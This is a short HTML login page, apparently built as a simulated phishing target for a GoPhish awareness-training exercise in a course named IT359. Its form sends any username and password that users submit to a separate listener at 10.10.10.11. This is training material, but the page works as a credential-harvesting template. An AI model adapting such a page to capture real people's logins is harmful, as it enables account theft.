<!--
  This is a simulated login page used in a GoPhish training campaign for IT359.
  It is designed to capture the login credentials submitted by users as part of a phishing test.
  The form sends the credentials via POST to the GoPhish listener at http://10.10.10.11/submit.
-->

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>IT359 GoPhish Project Login Page</title>
</head>
<body>
	<h2>IT359 GoPhish Project Login Page</h2>
	<form action="http://10.10.10.11/submit" method="POST">
		<label for="username">Username:</label>
		<input type="text" id="username" name="Username"><br><br>

		<label for="password">Password:</label>
		<input type="password" id="password" name="password"><br><br>

		<input type="submit" value="Login">
	</form>
</body>
</html>
